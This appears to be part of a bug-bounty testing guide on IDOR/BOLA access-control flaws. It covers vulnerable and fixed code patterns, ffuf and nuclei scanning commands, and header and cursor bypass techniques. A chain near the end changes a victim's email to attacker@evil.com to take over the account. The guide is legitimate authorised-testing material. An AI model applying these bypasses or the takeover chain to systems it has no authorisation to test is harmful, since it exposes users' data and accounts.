| 1 | Missing ownership check in ORM query | `Invoice.findById(req.params.id)` | `Invoice.findOne({ _id: req.params.id, userId: req.user.id })` |
| 2 | Authz at route level, not object level | Middleware checks "logged in?"; handler never checks "owns this object?" | Per-object ownership check in the resolver/service, not just middleware |
| 3 | Trusting client-supplied IDs in bodies | Server uses `org_id` from POST body without verifying caller belongs to that org | Derive `org_id` from the authenticated session; reject conflicting body values |
| 4 | GraphQL resolvers without field-level authz | Auto-generated resolvers fetch by ID without permission check | Field-level authz on every relation, especially `node(id:)` and nested connections |
| 5 | Inconsistent authz across HTTP verbs | GET protected; POST/DELETE on the same path is not | Centralize authz in the service layer so every verb passes through it |
| 6 | Indirect references exposed via related objects | Object A (accessible) references Object B (private); only B's direct route is protected | Treat every serialized ID as a potential object reference; authz on resolution, not on route |
| 7 | Race / state-based IDOR | Authz checked at creation, not at access | Re-check authz at every state transition; invalidate tokens on permission revocation |
| 8 | Multi-tenant isolation failure | `user_id` check present; `org_id`/`tenant_id` check absent | Always scope by both user and tenant; test cross-tenant explicitly |
| 9 | Signed-URL step skips object authz | Signing endpoint accepts any object ID and mints a URL | Authz the object before signing; bind the signed URL to the session where possible |
| 10 | Soft-delete without token revocation | `active=false` but session/PAT still valid | Revoke sessions/PATs on removal; re-check policy at every request |

---

## Part 9 — Wordlists, tools & automation

### 9.1 Tools

Autorize (Burp ext — auto-replays with a second user's session) · AuthMatrix (multi-role testing) · AuthAnalyzer (token swapping) · Burp Repeater · ffuf · mitmproxy · Postman · graphw00f · clairvoyance · inql · graphql-cop · GraphQLmap

### 9.2 Wordlists

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_idor.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_idor.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### 9.3 Nuclei

Nuclei only finds exposed objects; the real work is cross-account replay with two identities.

```sh
nuclei -u https://target -tags idor,exposure \
       -severity low,medium,high,critical -rl 40 -o nuclei_idor.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures \
       -rl 40 -o nuclei_idor_exposures.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### 9.4 Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class idor --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class idor
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class idor
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class idor --min-bounty 1000
```

---

## Part 10 — Additional bypass techniques (general knowledge, not corpus-sourced)

These are established IDOR/BOLA testing techniques worth adding to the arsenal. They are **not drawn from a fresh search of public write-ups** — this environment currently has web search off, so treat the CVE/report-backed sections above as the sourced material and this part as general tradecraft to try, not as citation-backed findings. Enable web search if you want this section refreshed against the latest disclosed reports and advisories.

### 10.1 Content-negotiation bypass

Some frameworks bind authz middleware to a specific route/format and skip it for alternate representations of the same resource:

```
GET /api/users/123          -> 403 (authz middleware attached)
GET /api/users/123.json     -> 200 (format suffix routes around the middleware)
GET /api/users/123.xml      -> 200
Accept: application/vnd.api+json   (vs. the default Accept the UI sends)
```

Always try the same object ID across every content-type/extension variant the API supports, not just the one the front-end uses.

### 10.2 `X-Original-URL` / `X-Rewrite-URL` rewrite-header bypass

Reverse proxies and some frameworks (notably older Spring/Symfony setups behind certain gateways) trust `X-Original-URL` or `X-Rewrite-URL` to decide the "real" path for authz purposes, while the actual handler routes on the request-line path. Send a request to an unauthenticated-looking path with the protected path in the header, or vice versa, and compare authz outcomes.

### 10.3 Debug / impersonation headers left enabled

Staging or admin-support tooling sometimes ships an "act as user" header that survives into production builds:

```
X-Impersonate-User: <victim_id>
X-Act-As: <victim_id>
X-Debug-User-Id: <victim_id>
X-On-Behalf-Of: <victim_id>
```

Worth a quick sweep on any endpoint that has an internal "support view" equivalent in the product (common in helpdesk/CRM-style SaaS).

### 10.4 Cache-key IDOR (shared cache serves victim's authenticated response to attacker)

If a CDN/edge cache's cache key doesn't include the `Authorization` header or session cookie (only the URL), a per-user response can get cached and served to a different authenticated user hitting the same URL. Request a personalized endpoint (`/api/me`, `/api/account/{id}`) as User A, then immediately replay the identical URL as User B and diff the response against B's own expected data — a hit of A's data via the cache is a cache-based IDOR, reportable alongside standard cache-poisoning methodology.

### 10.5 Pagination / cursor tampering

Opaque pagination cursors are frequently just base64 of a small JSON blob (`{"owner_id":123,"offset":40}`) or a signed-looking token that isn't actually verified server-side. Decode the cursor, swap the owner/tenant field, re-encode, and see whether the next page returns another user's records.

### 10.6 Secondary/public identifier aliasing

A resource often has two identifiers: the protected internal ID and a "public" one (share token, slug, short link) meant only for the owner to distribute — but if the public one resolves through an endpoint with weaker or no authz (e.g. a public-facing "view shared item" route), you can reach the same object without ever touching the protected ID. Map both identifier types for every object and test the weaker route.

### 10.7 Predictable storage-key IDOR in multi-tenant file storage

Multi-tenant apps that key S3/GCS objects by sequential or user-predictable paths (`uploads/{tenant_id}/{filename}`, `exports/{incrementing_id}.csv`) let you guess sibling objects directly against the storage provider if bucket/object ACLs don't independently enforce per-tenant isolation — don't stop testing at the app's API; test the storage URLs the API returns, too.

### 10.8 Async job / webhook replay IDOR

Background workers (report generation, export jobs, webhook delivery) sometimes run with elevated/service-level credentials and re-fetch an object by ID from the job payload without re-checking the requester's ownership at execution time (only at enqueue time, if at all). If you can influence a job's input ID (e.g. by resubmitting a captured webhook or export request with a different ID), the job may still execute with its elevated identity — classic "time of check, time of use" IDOR at the queue boundary, distinct from the state-machine race in §3.13.

### 10.9 Tenant-resolution case/locale confusion

When the tenant is resolved from a subdomain or header string (`tenant1.app.com`, `X-Tenant: tenant1`) and that string is used case-sensitively in one layer (routing) but case-insensitively in another (DB lookup), mismatched casing or Unicode-confusable characters can resolve to an unexpected tenant record. Worth a quick differential test on any subdomain- or header-based multi-tenant router.

---

## Part 11 — How to use this during an engagement

1. Confirm the differential is real. Two accounts, same request, different session, victim object ID. If you can't produce a body diff or a state-change confirmation, you don't have an IDOR — you have a status code.
2. Classify the identifier (§1.2) and pick the matching attack: ±1 for sequential, harvest for UUIDv4, derive for UUIDv1, decode for base64/Hashids, swap one component for composite.
3. Work through Part 3 bypasses when basic swapping returns 403 — path/param tricks, method gaps, verb override, shadow API, JWT claim trust, WebSocket frames, signed-URL step.
4. If GraphQL is present, run Part 4 — introspection → every id argument → `node(id:)` → field-level IDOR → aliases/batching → directive/persisted-query abuse.
5. Check BOPLA / mass assignment (§3.11) on every write endpoint — `workspaceId`, `role`, `is_admin`, `owner_id`, `verified`.
6. Sweep Part 10's additional tradecraft — content-negotiation, rewrite headers, impersonation headers, cache keys, cursors, secondary identifiers, storage keys, async jobs, tenant-resolution confusion — especially once the obvious vectors are blocked.
7. Look for the chain (Part 6). A read-IDOR alone is Low–Medium; the same bug plus an email-change, membership-add, refund, or soft-delete persistence is High–Critical.
8. Grade the impact honestly — confidentiality vs. integrity vs. availability; cross-tenant vs. same-tenant; one victim vs. mass extraction.
9. Meet the pre-report gate (top of document) and the reporting bar below before submitting.

---

## Part 12 — Reporting bar

- Prove real impact on a second controlled account (or a safe callback where applicable).
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Show the differential — victim's data returned under attacker session, or confirmed state change.
- Never report a 200-with-no-data IDOR — body-diff against a legitimate own-object response first.
- Attribute the sink — if several parameters/endpoints could be the cause, isolate one per request so the client patches the right field.
- Stay inside program scope and follow disclosure rules.

---

## Related skills & chains

- **hunt-auth-bypass** — object-level authz failure + route-level auth absence is the canonical IDOR amplifier. Chain: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session.
- **hunt-ato** — profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO.
- **hunt-graphql** — GraphQL resolvers without field-level authz are IDOR-by-default; introspection hands you the schema. Chain: `__schema` introspection → enumerate every mutation accepting `id:` → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` → mass IDOR fan-out from one introspection query.
- **hunt-ssrf** — SSRF often chains to internal object stores and signed-URL services; a leaked internal ID from an SSRF response can feed an IDOR on an internal API.
- **security-arsenal** — pull the IDOR Bypass Tables section for HPP (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when direct substitution returns 403.
- **triage-validation** — run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't leak data (empty array, redacted fields, "access denied" in body with 200). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.
- **hunt-business-logic** — Chain 6 (double-IDOR refund) is a business-logic composition; state-machine confusion and price manipulation often ride on the same missing object-level check.
- **hunt-xss** — Chain 2 (filename-controlled Content-Disposition) is a response-header XSS class; pair with the XSS skill when a download endpoint sets user-controlled headers.
